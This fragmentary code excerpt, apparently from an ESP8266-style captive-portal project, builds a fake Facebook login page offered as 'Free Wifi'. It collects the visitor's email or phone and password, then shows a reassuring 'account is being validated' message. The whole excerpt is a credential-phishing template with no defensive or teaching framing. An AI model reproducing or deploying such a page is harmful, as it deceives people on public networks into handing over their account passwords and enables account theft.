...
String index() {
  String htmlContent = "<!DOCTYPE html><html lang=\"pt-br\"><head>"
    ...
    "<p>Login Facebook</p>"
    "<input type=\"email\" autocomplete=\"email\" name=\"email\" id=\"email\" placeholder=\"Email or telephone\" required>"
    "<input type=\"password\" name=\"password\" id=\"password\" placeholder=\"Password\" required>"
    "<button type=\"submit\" name=\"submit\" id=\"submit\">Enter Free Wifi</button>"
...
String posted() {
  ...
  return header("Validating...") + "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you." + footer();
}
